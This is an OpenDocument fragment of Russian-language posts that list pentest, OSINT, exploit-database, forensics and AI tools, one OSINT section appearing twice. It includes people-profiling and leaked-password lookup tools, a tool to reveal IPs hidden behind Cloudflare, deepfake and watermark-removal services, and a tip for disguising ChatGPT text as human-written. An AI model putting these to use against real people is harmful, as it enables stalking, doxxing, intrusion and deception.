      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">3. SQLiPy (https://portswigger.net/bappstore/f154175126a04bfe8edc6056f340f52e) - Инструмент, который интегрирует Burp Suite с SQLMap с помощью SQLMap API, для проверки на уязвимость к SQL-инъекции.</text:span></text:p>
      <text:p text:style-name="P39">4. Active Scan++ (https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976) - расширяет перечень проверок, которые выполняются при работе активного и пассивного сканера. Он находит такие уязвимости, как cache poisoning, DNS rebinding, различные инъекции, а также делает дополнительные проверки для обнаружения XXE-инъекций и др.</text:p>
      <text:p text:style-name="P40">5. Turbo Intruder (https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) - более быстрый аналог Intruder, оснащенный скриптовым движком для отправки большого количества HTTP-запросов и анализа результатов. Полезен, если необходима скорость.</text:p>
      <text:p text:style-name="P39">OSINT: подборка сервисов для поиска по исходному коду. Тема поиска конфиденциальных данных в коде не теряет своей актуальности, когда разработчики по глупости вносят секретные данные, вроде паролей и ключей API, эти данные вполне могут добраться до общедоступных репозиториев, а после попасть в руки злоумышленников. В посте собрали сервисы анализа исходного кода, которые могут помочь в тестировании на проникновение, с целью проверки систем защиты:</text:p>
      <text:p text:style-name="P39">1. Searchcode (https://searchcode.com/) - сервис, по поиску с таких платформ, как: Github, Bitbucket, Google Code, Codeplex, Sourceforge, Fedora Project и других. Всего в базе более 18 млрд строк кода из более 200 000 проектов.</text:p>
      <text:p text:style-name="P39">2. Sourcegraph (https://sourcegraph.com/search) - функциональный поисковик, позволяющий искать необходимый код по всем находящимся в свободном доступе репо.</text:p>
      <text:p text:style-name="P39">3. grep.app (https://grep.app/) - сервис, который производит поиск по содержимому Git, полезен для поиска фрагментов кода, связанных с уязвимостями индикаторов компрометации и вредоносами.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">4. Reposearch (https://codefinder.org/) - поиск исходного кода в репозиториях SVN и GitHub.</text:span></text:p>
      <text:p text:style-name="P40">5. CSE от cipher387 (https://cipher387.github.io/code_repository_google_custom_search_engines/) - поиск в 20 репозиториях с открытым исходным кодом при помощи Github Dorks.</text:p>
      <text:p text:style-name="P39">Поиск по IoT, IP, доменам и поддоменам: 10 утилит. Сбор данных - неотъемлимая часть подготовки ко взлому, а благодаря некоторым инструментам противостояние этим действиям стало намного проще. Незащищенные IoT-устройства, IP-адреса, домены/поддомены подвергаются серьезной опасности, в истории куча инцидентов связанных с этой уязвимой группой, одним из инцидентов является брешь, из-за которой весь код сайта Vine (https://avicoder.me/2016/07/22/Twitter-Vine-Source-code-dump/) можно было загрузить с незащищённого поддомена (https://geekflare.com/schedule-website-security-vulnerabilities-scan/).</text:p>
      <text:p text:style-name="P39">1. OWASP Amass (https://github.com/OWASP/Amass) - сетевой сканер с функцией поиска информации в открытых источниках. Агрегирует информацию из десятков различных поисковых систем и баз данных.</text:p>
      <text:p text:style-name="P39">2. Infoooze (https://github.com/devXprite/infoooze) - инструмент OSINT на базе NodeJs. Объединяет в себе сканер портов и поддоменов, поиск DNS-поиск URL-сканер, поиск в Whois и еще ряд инструментов.</text:p>
      <text:p text:style-name="P39">3. Automater (http://www.tekdefense.com/automater/) - утилита для поиска URL, IP-адресов и хешей MD5, предназначенная для упрощения работы ИБ-аналитиков. Установлена в Kali Linux по умолчанию.</text:p>
      <text:p text:style-name="P42">4. Raccoon (https://github.com/evyatarmeged/Raccoon) - инструмент, созданный для разведки и сбора информации с упором на простоту. Использует Nmap (https://github.com/nmap/nmap) для сканирования портов и ряд пассивных методов поиска данных, чтобы собрать всестороннюю информацию о цели.</text:p>
      <text:p text:style-name="P43">5. Photon (https://github.com/s0md3v/Photon) - сканер для работы с информацией из открытых источников. Предназначен для сканирования конкретных веб-сайтов в поисках (pdf, png, xml и т. д.), ключей, поддоменов и многого другого. Экспортирует полученные данные в JSON.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">OSINT: подборка инструментов для автоматизации разведки. Фактически, весь OSINT сводится к тому, что вы просто анализируете всю доступную в интернете информацию о человеке, ручным поиском у вас уйдёт по меньшей мере пары часов, а автоматизировав поиск, например, с помощью Snoop не более 5 минут(ведёт поиск сразу минимум по 500 источникам). Остаётся лишь проанализировать и структурировать её. Инструменты поиска по имени и по никнейму:</text:span></text:p>
      <text:p text:style-name="P39">Maryam (https://github.com/saeeddhqan/Maryam) - в принципе, это один из самых многофункциональных инструментов поиска. Он неплохо подойдёт и для поиска по реальному имени и для поиска по никнейму.</text:p>
      <text:p text:style-name="P39">Snoop (https://github.com/snooppr/snoop) - это один из самых быстрых и мощных инструментов для поиска по имени. Он использует около 500 источников для сбора информации.</text:p>
      <text:p text:style-name="P39">Alfred (https://github.com/Alfredredbird/alfred) - утилита для сбора информации и идентификации аккаунтов в социальных сетях.</text:p>
      <text:p text:style-name="P39">Инструменты поиска по Email:</text:p>
      <text:p text:style-name="P39">Ghunt (https://github.com/mxrch/GHunt) - поиск информации о владельце Google аккаунта;</text:p>
      <text:p text:style-name="P39">Epieos (https://epieos.com/) - найдет Google ID, даст ссылки на профиль в Google карты, альбомы и календарь, найдет к каким сайтам привязана почта, профиль LinkedIn.</text:p>
      <text:p text:style-name="P39">H8mail (https://github.com/khast3x/h8mail) - инструмент для поиска взломанных адресов электронной почты и используемых на различных сайтах паролей в утекших базах данных.</text:p>
      <text:p text:style-name="P39">Инструменты для анализа и мониторинг соц. сетей:</text:p>
      <text:p text:style-name="P39">Social Searcher (https://www.social-searcher.com/) - бесплатный инструмент для мониторинга социальных сетей. Фактически это поисковая система, которая ищет упоминания по запросу.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">Google Alerts (https://www.google.com/alerts?hl=ru) - уведомляет вас о появлении в интернете указанной информации. Этот инструмент вы можете применить как на себя (мониторить информацию о себе), так и на вашу цель.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">CVE: подборка ресурсов по поиску уязвимостей. CVE (Common Vulnerabilities and Exposures) – это список известных уязвимостей и дефектов </text:span><text:soft-page-break/><text:span text:style-name="T6">безопасности. В ИБ пространстве необходимо знать всю информацию о недавно вышедшей уязвимости: понять насколько найденная уязвимость критична, имеются ли готовые эксплойты, кто из вендоров уже пропатчился и какие сканеры стоило бы использовать.</text:span></text:p>
      <text:p text:style-name="P39">1. Exploit DB (https://www.exploit-db.com/) - CVE-совместимый архив общедоступных эксплойтов и уязвимого программного обеспечения.</text:p>
      <text:p text:style-name="P39">2. GitHub Advisory Database (https://github.com/advisories) - база данных уязвимостей, включающая CVE и рекомендации по безопасности.</text:p>
      <text:p text:style-name="P39">3. MITRE CVE (https://www.cve.org/) - поисковик, база данных и общепринятый классификатор уязвимостей.</text:p>
      <text:p text:style-name="P39">4. Cloudvulndb (https://www.cloudvulndb.org/) - проект, который аккумулирует уязвимости и проблемы безопасности поставщиков облачных услуг.</text:p>
      <text:p text:style-name="P39">5. CVEDetails (https://www.cvedetails.com/), osv.dev (https://osv.dev/list), VulDB (https://vuldb.com/), maltiverse (https://maltiverse.com/search) - еще ряд источников данных об уязвимостях и индикаторах компрометации.</text:p>
      <text:p text:style-name="P43">6. sploitus (https://sploitus.com/) - поисковик по эксплойтам и хакерским инструментам.</text:p>
      <text:p text:style-name="P42">Forensics: подборка инструментов для криминалистики. Расследование инцидентов в области ИБ не такая горячая тема, как пентесты, но эта научная и практическая дисциплина продолжает развиваться, во многом, благодаря open-source сообществу. Давайте пройдемся по просторам GitHub и посмотрим, какие инструменты для сбора и анализа цифровых доказательств доступны всем желающим:</text:p>
      <text:p text:style-name="P39">1. SIFT Workstation (https://www.sans.org/tools/sift-workstation/) - набор бесплатных инструментов для форензики и реагирования на инциденты с открытым исходным кодом от SANS Institute (https://www.sans.org/about/?msc=main-nav). Универсальный и подробно документированный тулкит на основе Ubuntu LTS 20.04.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">2. Appliance for Digital Investigation and Analysis (ADIA) (https://forensics.cert.org/#ADIA) - Open Source инструментарий для проведения цифровых расследований и сбора данных, включающий Autopsy, Sleuth Kit (https://www.sleuthkit.org/sleuthkit/), Digital Forensics Framework </text:span><text:soft-page-break/><text:span text:style-name="T6">(https://github.com/arxsys/dff), log2timeline (https://plaso.readthedocs.io/en/latest/sources/user/Using-log2timeline.html), Xplico (https://www.xplico.org/) и Wireshark (https://www.wireshark.org/).</text:span></text:p>
      <text:p text:style-name="P39">3. Skadi (https://github.com/orlikoski/Skadi) - еще один набор утилит с открытым исходным кодом, который позволяет собирать, обрабатывать и проводить расширенный анализ криминалистических артефактов и изображений. Работает на MacOS, Windows и Linux, легко масштабируется.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">4. Autopsy (http://www.sleuthkit.org/autopsy/) - достаточно функциональна, чтобы занимать отдельное место в этом списке. Это платформа для цифровой криминалистики и графический интерфейс для анализатора образов дисков The Sleuth Kit (https://www.sleuthkit.org/sleuthkit/), PhotoRec (http://www.cgsecurity.org/wiki/PhotoRec), STIX (https://stixproject.github.io/) и других программ для цифровой криминалистики.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 21:</text:p>
      <text:p text:style-name="P39">1. Jan (https://jan.ai/) - тулза, которая позволяет использовать ChatGPT без VPN;</text:p>
      <text:p text:style-name="P39">2. LLM Prompting (https://mitenmit.github.io/gpt/) - крайне годный генератор промтов для всех популярных нейросетей:</text:p>
      <text:p text:style-name="P39">3. camerai <text:s/>(https://fal.ai/camera) - простейший сервис для создания дипфейков, для использования нужна только веб-камера;</text:p>
      <text:p text:style-name="P39">4. Image2SFX-comparison (https://huggingface.co/spaces/fffiloni/Image2SFX-comparison) - генерирует звуки из изображений, исходя из того, что на них находится:</text:p>
      <text:p text:style-name="P39">5. Comic Translate <text:s/>(https://github.com/ogkalu2/comic-translate) - переведет ваши любимые комиксы на нужный вам язык;</text:p>
      <text:p text:style-name="P39">6. FMA-Net (https://github.com/KAIST-VICLab/FMA-Net) - существенно улучшает качество видео и стабилизирует камеру;</text:p>
      <text:p text:style-name="P43">7. Globe (https://explorer.globe.engineer/) - составляет доклад на любую тему: пишем заголовок и на выходе получаем текст, графики, слайды и т. д.</text:p>
      <text:p text:style-name="P37"><text:span text:style-name="T6">OSINT: подборка инструментов для автоматизации разведки. Фактически, весь OSINT сводится к тому, что вы просто анализируете всю доступную в интернете информацию о человеке. Ручным поиском у вас уйдёт по меньшей </text:span><text:soft-page-break/><text:span text:style-name="T6">мере пара часов, а автоматизировав поиск, например, с помощью Snoop не более 5 минут(ведёт поиск сразу минимум по 500 источникам). Остаётся лишь проанализировать и структурировать её. Инструменты поиска по имени и по никнейму:</text:span></text:p>
      <text:p text:style-name="P39">Maryam (https://github.com/saeeddhqan/Maryam) - в принципе, это один из самых многофункциональных инструментов поиска. Он неплохо подойдёт и для поиска по реальному имени и для поиска по никнейму.</text:p>
      <text:p text:style-name="P39">Snoop (https://github.com/snooppr/snoop) - это один из самых быстрых и мощных инструментов для поиска по имени. Он использует около 500 источников для сбора информации.</text:p>
      <text:p text:style-name="P39">Alfred (https://github.com/Alfredredbird/alfred) - утилита для сбора информации и идентификации аккаунтов в социальных сетях.</text:p>
      <text:p text:style-name="P39">Инструменты поиска по Email:</text:p>
      <text:p text:style-name="P39">Ghunt (https://github.com/mxrch/GHunt) - поиск информации о владельце Google аккаунта;</text:p>
      <text:p text:style-name="P39">Epieos (https://epieos.com/) - найдет Google ID, даст ссылки на профиль в Google карты, альбомы и календарь, найдет к каким сайтам привязана почта, профиль LinkedIn.</text:p>
      <text:p text:style-name="P39">H8mail (https://github.com/khast3x/h8mail) - инструмент для поиска взломанных адресов электронной почты и используемых на различных сайтах паролей в утекших базах данных.</text:p>
      <text:p text:style-name="P39">Инструменты для анализа и мониторинга соц. сетей:</text:p>
      <text:p text:style-name="P39">Social Searcher (https://www.social-searcher.com/) - бесплатный инструмент для мониторинга социальных сетей. Фактически это поисковая система, которая ищет упоминания по запросу.</text:p>
      <text:p text:style-name="P40">Google Alerts (https://www.google.com/alerts?hl=ru) - уведомляет вас о появлении в интернете указанной информации. Этот инструмент вы можете применить как на себя (мониторить информацию о себе), так и на вашу цель.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">Удаляем свои данные из интернета. Интернет помнит все и это, безусловно, так. Но это не мешает удалить большую часть своих данных из него. 1. Сначала читаем эту статью <text:s/>(https://telegra.ph/Kak-udalit-lichnye-dannye-iz-probiv-servisov-i-ne-tolko-09-18)и делаем все, что там написано. 2. Далее можем использовать инструменты, которые в статье не упомянуты: Mine </text:span><text:soft-page-break/><text:span text:style-name="T6">(https://www.saymine.com/) аналог deseat.me, который перестал работать. Сервис платный, стоит 1$ в месяц. Mozilla Monitor (https://monitor.mozilla.org/) показывает ваши почтовые адреса и номера телефонов в различных утечках. Delete Me <text:s/>(https://joindeleteme.com/)еще один платный сервис, стоит 8$ в месяц, отслеживает и удаляет данные нон-стопом у всех брокеров данных. Account Killer (https://www.accountkiller.com/en/popular) помогает найти старые аккаунты в социальных сетях и сервисах и удалить их.</text:span></text:p>
      <text:p text:style-name="P39">В подборку https://hacker-basement.com/osint-list/ добавил несколько актуальных инструментов:</text:p>
      <text:p text:style-name="P42">https://www.lopseg.com.br/osint - вводишь домен, получаешь ссылки на разные ресурсы для сбора информации о нём</text:p>
      <text:p text:style-name="P42">https://start.me/p/zpkMMO/deep-fake-tools-detection - подборка статей и инструментов для выявления/создания deepfakes</text:p>
      <text:p text:style-name="P39">https://github.com/spyboy-productions/CloakQuest3r - инструмент для раскрытия IP-адреса, скрытого Cloudflare</text:p>
      <text:p text:style-name="P39">https://geospy.web.app - определит предположительное место где сделана фотография</text:p>
      <text:p text:style-name="P40">https://mattw.io/youtube-geofind/location - найдёт видео на YouTube снятые в указанном месте (если есть геотег)</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">Есть такой полезный сайт https://whatsmyname.app ищет аккаунты пользователя по разным сайтам (на данный момент 625 источников). Функция, мягко скажем, не эксклюзивная, да и список источников не рекордный (если нужно больше, то можно использовать https://github.com/soxoj/maigret). А пишу я про него потому как там есть несколько особенностей, которые могут быть очень полезными: Может искать сразу по нескольким именам. Полученные результаты можно, в одно нажатие, скачать в формате CSV или PDF (на выходе будет удобная табличка). Одновременно с основным поиском он ищет в гугле, в том числе и документы где упоминается нужное имя. Искать сразу по всем сайтам не обязательно, можно ограничить поиск категориями. Например искать только по социальным сетям. Это может быть полезно когда мы точно понимаем где и кого мы хотим найти. Базу источников можно заменить на свою. Например создать базу для поиска по сайтам какой-то отдельной страны или по </text:span><text:soft-page-break/><text:span text:style-name="T6">сайтам какой-то тематики, или ещё чего-нибудь на что хватит фантазии. Штука ситуативно полезная, но немного замороченная, потому вот краткий гайд: Качаем консольный клиент WhatsMyName и устанавливаем зависимости:</text:span></text:p>
      <text:p text:style-name="P39">git clone https://github.com/grabowskiadrian/whatsmyname-client.git</text:p>
      <text:p text:style-name="P39">cd WhatsMyName-Client</text:p>
      <text:p text:style-name="P39">pip3 install -r requirments.txt</text:p>
      <text:p text:style-name="P39">создаём свою базу сайтов в формате JSON. Посмотреть как она должна выглядеть можно в файле wmn-data.json оф. репозитория WhatsMyName (https://github.com/WebBreacher/WhatsMyName) </text:p>
      <text:p text:style-name="P39">Запускаем поиск по созданной базе:</text:p>
      <text:p text:style-name="P39">python3 wmnc.py find ИМЯ -l /путь/к/файлу/json</text:p>
      <text:p text:style-name="P40">Пример подборки ресурсов WhatsMyName для поиска на польских сайтах: https://github.com/dudek-marcin/WhatsMyName-Polish-List</text:p>
      <text:p text:style-name="P43">В подборку инструментов https://hacker-basement.com/osint-list/ добавил раздел "Проверка фактов": https://feat.onrender.com - по фразе или ключевым словам показывает статистику и места упоминания, ищет первоисточник публикаций, показывает какие публикации уже опровергнуты либо подтверждены; https://toolbox.google.com/factcheck - Google Fact Check Tools. Ищет пруфы либо опровержения по заданным ключевым словам; https://github.com/cqcore/Fact-Checking-Verification?tab=readme-ov-file - подборка инструментов и ресурсов для проверки фактов, а также инструменты верификации изображений</text:p>
      <text:p text:style-name="P42">Не популярные, но приватные способы передачи файлов:</text:p>
      <text:p text:style-name="P39">2. blindsend <text:s/>(https://github.com/blindnet-io/blindsend) - утилита для безопасного обмена файлами со сквозными шифрованием;</text:p>
      <text:p text:style-name="P39">3. croc - инструмент, который позволяет любым двум компьютерам просто и безопасно обмениваться файлами. Единственный в своем роде CLI-файлообменник. </text:p>
      <text:p text:style-name="P39">4. Wormhole (https://wormhole.app/) - еще один сервис отправки зашифрованных файлов, не требующий регистрации. Наверное, авторы впечатлились Magic Wormhole.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">5. Catbox (https://catbox.moe/) - анонимный файлообменник. Запрещена загрузка файлов .exe, .scr, .cpl, .doc, .jar.</text:span></text:p>
      <text:p text:style-name="P39">6. Surge - «P2P на стероидах». Уникальный клиент для анонимного обмена файлами.</text:p>
      <text:p text:style-name="P39">7. Sendfiles.online - сервис для отправки зашифрованных файлов посредством рандомного пароля. </text:p>
      <text:p text:style-name="P39">8. blaze <text:s/>(https://blaze.vercel.app/) - еще один сервис для безопасной отправки файлов;</text:p>
      <text:p text:style-name="P40">Бонус: Portal (https://github.com/SpatiumPortae/portal), Winden (https://winden.app/s), Pairdrop (https://github.com/schlagmichdoch/PairDrop)</text:p>
      <text:p text:style-name="P40">Делаем вид, что текст написал не ChatGPT, а вы: Генерируем текст в чат-боте и копируем; Вставляем в окно на сайте undetectable.ai; Нажимаем кнопку «Humanize». Интерфейс на английском, но поддержка русского языка тоже есть. Только не забудьте перепроверить за нейронкой, насколько логично все написано.</text:p>
      <text:p text:style-name="P39">Forensics: подборка утилит по анализу файлов и данных.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файлов и данных.</text:p>
      <text:p text:style-name="P39">1. analyzeMFT (https://github.com/dkovar/analyzeMFT): утилита парсинга MFT из файловой системы NTFS, позволяя анализировать результаты с помощью других инструментов.</text:p>
      <text:p text:style-name="P39">2. Crowd Inspect (http://www.crowdstrike.com/community-tools/): утилита для получения информации о сетевых процессах, перечислении двоичных файлов, связанных с каждым процессом. Создает запросы к VirusTotal и другим онлайн-средствам анализа вредоносных программ и служб репутации.</text:p>
      <text:p text:style-name="P39">3. Defraser (http://sourceforge.net/projects/defraser/): утилита для обнаружения полных и частичных данных о мультимедийных файлах в нераспределенном пространстве.</text:p>
      <text:p text:style-name="P37"><text:soft-page-break/><text:span text:style-name="T6">4. Encryption Analyzer (http://www.lostpassword.com/encryption-analyzer.htm): утилита для анализа защищенных паролем и зашифрованных файлов, анализирует сложность шифрования отчетов и варианты дешифрования для каждого файла.</text:span></text:p>
      <text:p text:style-name="P42">5. Shadow Explorer (http://www.shadowexplorer.com/): утилита для просмотра и извлечения файлов из теневых копий.</text:p>
      <text:p text:style-name="P39">Ресурсы для изучения юридических лиц в офшорной юрисдикции Кипр:</text:p>
      <text:p text:style-name="P39">https://opencorporates.com - основной инструмент для работы, умеет икать по реестрам большого количества стран, в том числе по офшорам. Удобный поиск как по юрлицам, так и по должностным лицам, также показывает историю изменений в организационной форме компании</text:p>
      <text:p text:style-name="P39">https://efiling.drcor.mcit.gov.cy/DrcorPublic/SearchForm.aspx?sc=0 - реестр департамента компаний и интеллектуальной собственности Кипра. Не очень удобен, в основном полезен если нужны пруфы в виде официальных данных о регистрации компании</text:p>
      <text:p text:style-name="P39">https://i-cyprus.com - за 50 евро сделает выписку по Кипрской компании. В выписке будут адреса, учредители, должностные лица, акционеры и скан копии всех документов компании которые есть в реестре.</text:p>
      <text:p text:style-name="P39">https://search.gleif.org - поиск по LEI Records (код идентификации, обеспечивающий возможность четкой и уникальной идентификации юридических лиц, участвующих в финансовых транзакциях). По сути тут будет таже информация что и в предыдущих реестрах, даже меньше и не все компании там есть. Но есть дополнительная фишка: в разделе Headquarters часто показан реальный адрес (а не офшорный) по которому находится офис реального владельца компании (так происходит из-за замороченной процедуры сертификации GLEIF).</text:p>
      <text:p text:style-name="P39">https://offshoreleaks.icij.org - база данных утечек документов из офшоров. Могут быть данные о реальных бенефициарах и связанных лицах</text:p>
      <text:p text:style-name="P39">http://cylaw.org - реестр судебных решений и нормативно-правовых актов Кипра. Есть поиск по ключевым словам</text:p>
      <text:p text:style-name="P40">https://www.data.gov.cy - национальный портал открытых данных Кипра. Куча статистической информации о Кипре и всему что там происходит. Поиск работает максимально коряво, но иногда получается находить полезную информацию, например о деятельности компаний, в том числе иностранных</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">Forensics: подборка утилит по анализу файлов и данных (ч.2).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файлов и данных.</text:span></text:p>
      <text:p text:style-name="P39">1. bstrings (https://binaryforay.blogspot.co.uk/2015/07/introducing-bstrings-better-strings.html): утилита поиска в двоичных данных, включая поиск регулярных выражений.</text:p>
      <text:p text:style-name="P39">2. eCryptfs Parser (http://sourceforge.net/projects/ecryptfs-p/): утилита рекурсивно анализирует заголовки каждого файла eCryptfs в выбранном каталоге.</text:p>
      <text:p text:style-name="P39">3. Link Parser (http://www.4discovery.com/our-tools/): утилита для рекурсивного анализа папок, извлекающая более 30 атрибутов из файлов Windows .lnk (shortcut).</text:p>
      <text:p text:style-name="P39">4. MetaExtractor (http://www.4discovery.com/our-tools/): утилита для извеления мета-информации из офисных документов и pdf.</text:p>
      <text:p text:style-name="P39">5. Memoryze (http://www.mandiant.com/products/free_software/memoryze/): анализ образов RAM, включая анализ «page» файлов.</text:p>
      <text:p text:style-name="P41">Forensics: подборка инструментов для анализа мобильных устройств.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мобильных устройств.</text:p>
      <text:p text:style-name="P39">1. ivMeta (http://www.csitech.co.uk/ivmeta-iphone-metadata/): утилита для извлечения модели телефона и версии программного обеспечения, а также временные данные и данные GPS с видео iPhone.</text:p>
      <text:p text:style-name="P39">2. iPhone Analyzer (http://sourceforge.net/projects/iphoneanalyzer/): утилита анализа файловой структуры Pad, iPod и iPhone.</text:p>
      <text:p text:style-name="P39">3. Rubus (https://www.cclgroupltd.com/rubus/): утилита для деконструирования резервных файлов Blackberry .ipd.</text:p>
      <text:p text:style-name="P39">4. SAFT (http://www.signalsec.com/saft/): извлечение SMS, журналов звонков и контактов из Android устройств.</text:p>
      <text:p text:style-name="P40">5. iPBA2 (https://github.com/PicciMario/iPhone-Backup-Analyzer-2): утилита анализа резервных копий iOS.</text:p>
      <text:p text:style-name="P39">Макро-OSINT. Часть 3. Продолжаем заниматься глобальной разведкой:</text:p>
      <text:p text:style-name="P39">1. GeoSpy AI - OSINT-инструмент определения геолокации по фотографии. На базе ИИ. Хорошо работает с фотографиями, на которых 2 и более ориентира.</text:p>
      <text:p text:style-name="P39">2. Worldview (https://worldview.earthdata.nasa.gov/) <text:s/>- инструмент, позволяющий следить за погодными явлениями и катаклизмами по всей планете; </text:p>
      <text:p text:style-name="P39">3. Geogramint <text:s/>- OSINT-инструмент, позволяющий определять геолокацию пользователей Telegram со включенной функцией поиска людей рядом; </text:p>
      <text:p text:style-name="P39">4. ShadeMap <text:s/>(https://shademap.app/@55.7483,37.6171,15z,1721512589300t,0b,0p,0m) - еще одна интерактивная карта, позволяющая увидеть тенистые места в вашем городе;</text:p>
      <text:p text:style-name="P39">5. Earth (https://earth.nullschool.net/ru/) <text:s/>- глобальная карта погодных условий;</text:p>
      <text:p text:style-name="P20"><text:soft-page-break/><text:span text:style-name="T6">6. Windy (https://www.windy.com/ru/-%D0%9F%D0%BE%D1%80%D1%8B%D0%B2%D1%8B-%D0%B2%D0%B5%D1%82%D1%80%D0%B0-gust?gust,53.904,43.594,3,m:fX0agYF) <text:s/>- карта с порывами ветра в реальном времени</text:span></text:p>
      <text:p text:style-name="P39">Макро-OSINT. Часть 4. Занимаемся глобальной разведкой:</text:p>
      <text:p text:style-name="P39">1. Soar <text:s/>(https://soar.earth/maps) - цифровой атлас. содержит более 500 000 вариаций карт (исторических, военных, топографических и т.д);</text:p>
      <text:p text:style-name="P39">2. World Imager Wayback (https://livingatlas.arcgis.com/wayback/) <text:s/>- карты, которые содержат историю спутниковых снимков за разные года. Позволяют понять, как менялась местность;</text:p>
      <text:p text:style-name="P39">3. HereWeGo Maps (https://wego.here.com/) <text:s/>- аналог гугл карт, в приложении можно скачать карту местности и пользоваться ей оффлайн;</text:p>
      <text:p text:style-name="P39">4. Sentinel Hub (https://apps.sentinel-hub.com/eo-browser) <text:s/>- информация с различных спутников в режиме реального времени. Можно переключаться между спутниками;</text:p>
      <text:p text:style-name="P42">5. KartaView <text:s/>(https://kartaview.org/landing) - карта для просмотра улица на базе OpenStreetMap;</text:p>
      <text:p text:style-name="P43">6. InstantStreetView <text:s/>(https://www.instantstreetview.com/) - еще одна карта для просмотра улиц, но на базе Google;</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">К вопросу выбора поисковой системы. Имеется в виду с точки зрения сбора информации о чём-либо. Можно как угодно относится к Google, но использовать его придется в любом случае, просто потому что он самый большой и с этим глупо спорить. Есть более конструктивный вопрос. У многих стран есть свои поисковые системы. Кто-то называет их национальные, кто-то региональные, но это не важно. Важный вопрос: нужно ли их использовать? Правильный ответ один: да, нужно, но не вместо, а в дополнение к Google. Просто потому, что есть большая вероятность получить оттуда дополнительную информацию. А информации много не бывает. Как определить, в неочевидных случаях, необходимость воспользоваться другим (отличным от Google) поисковиком? Всё очень просто, идём на: https://gs.statcounter.com/search-engine-market-share. И в разделе Region выбираем нужную нам страну и смотрим какая </text:span><text:soft-page-break/><text:span text:style-name="T6">поисковая система там наиболее популярна. Соответственно её мы и будем использовать в дополнение к Google.</text:span></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 22:</text:p>
      <text:p text:style-name="P39">1. Remaker <text:s/>(https://remaker.ai/ai-tattoo-generator/) - генератор татуировок. </text:p>
      <text:p text:style-name="P39">2. Musichero (https://musichero.ai/ru/app) - генератор музыки, бесплатный, есть русский язык.</text:p>
      <text:p text:style-name="P39">3. AlFreeBox (https://aifreebox.com/) <text:s/>- нейросеть для создания контента во все социальные сети;</text:p>
      <text:p text:style-name="P39">4. PixArt Sigma 900M (https://huggingface.co/spaces/dataautogpt3/PixArt-Sigma-900M) <text:s/>- генератор картинок прямо в браузере;</text:p>
      <text:p text:style-name="P39">5. Code to Flowchart (https://codetoflow.com/) <text:s/>- объясняет любой код, будет полезна программистам;</text:p>
      <text:p text:style-name="P40">6. RenderNet <text:s/>(https://rendernet.ai/app/canvases) - делает дипфейки прямо в браузере</text:p>
      <text:p text:style-name="P39">Убираем объекты и вотермарки с изображения. Часть 4:</text:p>
      <text:p text:style-name="P39">1. https://acetone.ai/</text:p>
      <text:p text:style-name="P39">2. https://snapedit.app/ru/remove-object</text:p>
      <text:p text:style-name="P39">3. https://snapedit.app/ru</text:p>
      <text:p text:style-name="P39">4. https://picwish.com/remove-unwanted-object</text:p>
      <text:p text:style-name="P39">5. https://firefly.adobe.com</text:p>
      <text:p text:style-name="P39">6. https://www.artguru.ai/ru/remove-object-from-photo/</text:p>
      <text:p text:style-name="P39">7. https://anieraser.media.io/app/</text:p>
      <text:p text:style-name="P39">8. https://clearoff.imagewith.ai/</text:p>
      <text:p text:style-name="P39">9. https://www.photoroom.com/tools/remove-object-from-photo</text:p>
      <text:p text:style-name="P39">10. https://www.ifoto.ai/watermark-remover</text:p>
      <text:p text:style-name="P39">11. https://www.avaide.com/watermark-remover/</text:p>
      <text:p text:style-name="P39">12. https://remaker.ai/features/ai-remove-object/</text:p>
      <text:p text:style-name="P39">13. https://www.x-design.com/object-remover</text:p>
      <text:p text:style-name="P39">14. https://www.zmo.ai/ai-photo-editor/remove-watermark-from-photo/</text:p>
      <text:p text:style-name="P43">15. https://myedit.online/en/photo-editor/object-removal</text:p>
      <text:p text:style-name="P37"><text:soft-page-break/><text:span text:style-name="T6">При изучении деятельности компании, важный момент на который нужно обращать внимание это то, что эта компания производит. Особенно это имеет значение если продукция производится под собственным брендом/товарным знаком. Каждый первый производитель, вышедший на, хоть сколько-нибудь, большие объемы, стремится придумать собственный бренд (что логично). А придумав бренд, тут же идет его регистрировать. А если вдруг появляется вероятность, что продукция может начать продаваться чуть больше чем в одной стране, то и соответствующая регистрация бренда/товарного знака/интеллектуальной собственности случится больше чем в одной стране. А нам это может быть очень полезно. Первое, что стоит сделать это проверить в каких странах зарегистрирован интересующий нас бренд или товарный знак. Благодаря этому мы узнаем юридические лица действующие на территории других стран, а также непосредственно физических лиц, зарегистрировавших товарный знак. Более того, даже в известных нам странах стоит перепроверить, т.к. не всегда правообладатель = производитель, соответственно таким способом получится узнать дополнительные компании и людей. Базы брендов и объектов интеллектуальной собственности есть почти в любой стране, но также есть агрегаторы баз, по ним искать быстрее и комплекснее, особенно если мы точно не знаем полный перечень интересующих нас стран</text:span></text:p>
      <text:p text:style-name="P39">https://branddb.wipo.int - глобальная база брендов. Можно искать по названию, по части названия, по фото, по правообладателю и по стране т.е. всеми доступными способами. Можно скачать, как найденные результаты по бренду, так и выписку по нужной стране</text:p>
      <text:p text:style-name="P40">https://www.tmdn.org/tmview - это база Ведомства интеллектуальной собственности Европейского союза. По сути тоже самое, что и предыдущая база, но с немного другим дизайном. Она тоже охватывает весь мир, но по Европе, вроде как, больше информации. Но это ситуативно, потому лучше смотреть и там и там</text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 23:</text:p>
      <text:p text:style-name="P39">1. Neural Writer (https://neuralwriter.com/ru/) - целый ИИ-инструментарий для работы с текстом (пишет, очеловечивает, рерайтит и т.д.)</text:p>
